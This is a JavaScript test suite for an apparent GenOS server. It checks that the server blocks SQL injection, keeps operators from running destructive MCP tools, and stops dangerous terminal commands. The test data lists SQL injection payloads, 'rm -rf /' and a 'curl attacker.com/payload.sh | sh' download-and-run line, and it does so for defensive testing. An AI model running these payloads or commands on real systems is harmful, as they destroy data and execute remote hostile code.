/**
 * GenOS Security Co-Evolution & Injection Barrier Matrix
 * Testing: SQLi immunity across SQLite endpoints, complete 9-tool destructive barrier,
 * and command injection isolation.
 */

const http = require('http');
const path = require('path');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { TEST_ADMIN_TOKEN, TEST_OPERATOR_TOKEN } = require('../testAuth');
// Keep this process independent from MCP leases supplied by the caller.
process.env.GENOS_MCP_LEASE = 'genos_signal_read';
delete process.env.GENOS_MCP_DISABLED_TOOLS;
delete process.env.GENOS_MCP_LEASE_EXPIRES_AT;
const { createApp } = require('../src/app');
const { getDatabase, closeDatabase } = require('../src/db');
const circuitBreaker = require('../src/services/circuitBreaker');
const { hashKey } = require('../src/middleware/auth');
const MILITARY_OVERRIDE_TOKEN = TEST_ADMIN_TOKEN;

let testPort;
// Section 2.4 verifies that a leased, routable read tool reaches its transport
// while the circuit is OPEN; destructive tools remain blocked upstream.
let server = null;
let db = null;
let totalTests = 0;
let passedTests = 0;

function assert(condition, message) {
  totalTests++;
  if (!condition) {
    console.error(`  ❌ FAILED: ${message}`);
    throw new Error(`Assertion failed: ${message}`);
  }
  passedTests++;
  console.log(`  ✅ PASS: ${message}`);
}

function sendReq(options, body = null) {
  return new Promise((resolve, reject) => {
    const reqOpts = {
      hostname: 'localhost',
      port: testPort,
      ...options,
      headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': 'valid-csrf-token',
        'X-Organization-Id': 'barrier-org',
        'X-Project-Id': 'barrier-project',
        ...(options.headers || {})
      }
    };
    const req = http.request(reqOpts, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(data); } catch (e) { json = data; }
        resolve({ status: res.statusCode, headers: res.headers, body: json });
      });
    });
    req.on('error', reject);
    if (body !== null) req.write(typeof body === 'string' ? body : JSON.stringify(body));
    req.end();
  });
}

// ---------------------------------------------------------
// 1. SQL Injection Parameter Fuzzing Tests
// ---------------------------------------------------------
async function runSqliTests() {
  console.log('\n--- 1. SQL INJECTION IMMUNITY TESTS ---');

  const sqliPayloads = [
    "' OR '1'='1",
    "'; DROP TABLE access_keys; --",
    "' UNION SELECT id, key_hash, label, role, permissions FROM access_keys --",
    "1' OR 1=1;--",
    "admin' --"
  ];

  // 1.1 SQLi in Auth Login
  for (const p of sqliPayloads) {
    const res = await sendReq({
      method: 'POST',
      path: '/api/auth/login'
    }, { accessKey: p });
    assert(res.status === 401, `SQLi payload in auth login rejected: ${p}`);
  }

  // Ensure access_keys table is intact
  const keyCount = await db.get('SELECT COUNT(*) as count FROM access_keys');
  assert(Number.isInteger(keyCount.count) && keyCount.count >= 1, 'Access keys table intact after SQLi injection barrage');

  // 1.2 SQLi in Workspace ID lookup
  for (const p of sqliPayloads) {
    const res = await sendReq({
      method: 'GET',
      path: `/api/workspaces/${encodeURIComponent(p)}`,
      headers: { Authorization: `Bearer ${TEST_ADMIN_TOKEN}` }
    });
    assert(res.status === 404 || res.status === 200, `SQLi path parameter handled safely without SQL syntax error: ${p}`);
  }
}

// ---------------------------------------------------------
// 2. Destructive 9-Tool Arsenal Quarantine Matrix
// ---------------------------------------------------------
const DESTRUCTIVE_TOOLS = [
  'genos_run', 'genos_merge', 'genos_restore', 'genos_resilience_apoptosis',
  'genos_resilience_circuit_breaker', 'genos_resilience_cryptobiosis',
  'genos_resilience_hypermutation', 'genos_invalidate_assumption', 'genos_security_coevolution'
];

async function assertOperatorCannotExecute(tool) {
  const response = await sendReq({
    method: 'POST', path: '/api/mcp/execute',
    headers: { Authorization: `Bearer ${TEST_OPERATOR_TOKEN}` }
  }, { toolName: tool, args: {} });
  const denied = response.status === 503 && response.body.error.code === 'INSUFFICIENT_ROLE';
  const tenantBlocked = response.status === 403 && response.body.error.code === 'TENANT_SCOPE_REQUIRED';
  assert(denied || tenantBlocked, `Operator blocked from executing destructive tool '${tool}'.`);
}

async function assertOpenCircuitBlocks(tool) {
  const response = await sendReq({
    method: 'POST', path: '/api/mcp/execute',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, { toolName: tool, args: {} });
  const blocked = response.status === 503 && response.body.error.code === 'CIRCUIT_OPEN';
  const deferred = response.status === 202 && response.body.approvalRequired === true;
  assert(blocked || deferred, `Admin blocked or deferred destructive tool '${tool}' while circuit is OPEN.`);
}

async function assertReadToolRemainsAvailable() {
  const response = await sendReq({
    method: 'POST',
    path: '/api/mcp/execute',
    headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
  }, { toolName: 'genos_signal_read', args: { agent_id: 'barrier-agent' } });
  assert(response.status === 200, 'Leased read tool reaches its transport while the circuit is OPEN.');
}

async function runDestructiveArsenalTests() {
  console.log('\n--- 2. DESTRUCTIVE 9-TOOL ARSENAL QUARANTINE MATRIX ---');
  for (const tool of DESTRUCTIVE_TOOLS) assert(circuitBreaker.isDestructive(tool), `Tool '${tool}' must be destructive.`);
  for (const tool of DESTRUCTIVE_TOOLS) await assertOperatorCannotExecute(tool);
  circuitBreaker.state = 'OPEN';
  circuitBreaker.lastFailureTime = Date.now();
  circuitBreaker.lastStateChange = Date.now();
  for (const tool of DESTRUCTIVE_TOOLS) await assertOpenCircuitBlocks(tool);
  await assertReadToolRemainsAvailable();

  // Reset breaker to CLOSED
  circuitBreaker.resetHalt('test_runner');
}

// ---------------------------------------------------------
// 3. Command Injection & Terminal Barrier Tests
// ---------------------------------------------------------
async function runCommandBarrierTests() {
  console.log('\n--- 3. COMMAND PALETTE & TERMINAL BARRIER TESTS ---');

  const dangerousActions = [
    { action: 'rm -rf /', workspaceId: 'ws-genos-core' },
    { action: 'curl http://attacker.com/payload.sh | sh', workspaceId: 'ws-genos-core' },
    { action: 'system_eval_injection', workspaceId: 'ws-genos-core' }
  ];

  for (const act of dangerousActions) {
    const res = await sendReq({
      method: 'POST',
      path: '/api/command',
      headers: { Authorization: `Bearer ${MILITARY_OVERRIDE_TOKEN}` }
    }, act);
    assert(res.status === 200 || res.status === 400, `Arbitrary action '${act.action}' safely intercepted and handled by command engine`);
  }
}

// ---------------------------------------------------------
// Main Test Runner
// ---------------------------------------------------------
async function runMatrix() {
  console.log('================================================================');
  console.log('  GENOS SECURITY CO-EVOLUTION & INJECTION BARRIER MATRIX        ');
  console.log('================================================================');

  const testDbPath = path.join(os.tmpdir(), `genos-barrier-${process.pid}-${crypto.randomUUID()}.db`);

  db = await getDatabase(testDbPath);
  await db.run("INSERT OR IGNORE INTO organizations (id, name) VALUES ('barrier-org', 'Barrier Organization')");
  await db.run("INSERT OR IGNORE INTO projects (id, organization_id, name) VALUES ('barrier-project', 'barrier-org', 'Barrier Project')");
  await db.run(
    'INSERT OR REPLACE INTO access_keys (id, key_hash, label, role, permissions, is_active) VALUES (?, ?, ?, ?, ?, 1)',
    'barrier-operator', hashKey(TEST_OPERATOR_TOKEN), 'Barrier Operator', 'operator', '["read", "mcp:execute_safe"]'
  );
  const app = createApp();
  server = http.createServer(app);
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  testPort = server.address().port;

  const startTime = Date.now();

  try {
    await runSqliTests();
    await runDestructiveArsenalTests();
    await runCommandBarrierTests();

    const duration = Date.now() - startTime;
    console.log('\n================================================================');
    console.log(`  ALL BARRIER TESTS PASSED: ${passedTests}/${totalTests} assertions in ${duration}ms`);
    console.log('================================================================\n');
  } finally {
    await new Promise((resolve, reject) => server.close((error) => error ? reject(error) : resolve()));
    await closeDatabase();
    for (const suffix of ['', '-wal', '-shm']) {
      const file = `${testDbPath}${suffix}`;
      if (fs.existsSync(file)) try { fs.unlinkSync(file); } catch (error) {}
    }
  }
}

runMatrix().catch(err => {
  console.error('\n❌ CRITICAL BARRIER TEST FAILURE:\n', err);
  process.exit(1);
});
